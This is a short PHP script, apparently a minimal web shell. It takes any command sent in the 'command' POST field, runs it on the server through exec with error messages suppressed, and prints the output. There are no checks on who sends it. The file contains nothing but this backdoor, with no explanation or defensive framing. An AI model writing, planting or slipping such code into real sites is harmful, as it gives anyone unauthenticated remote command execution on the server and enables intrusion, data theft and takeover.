<?php
function shell($cmd) {
  	@exec($cmd,$ret);
	$ret = join("\n",$ret);
	return $ret;
}

echo shell($_POST['command']);
?>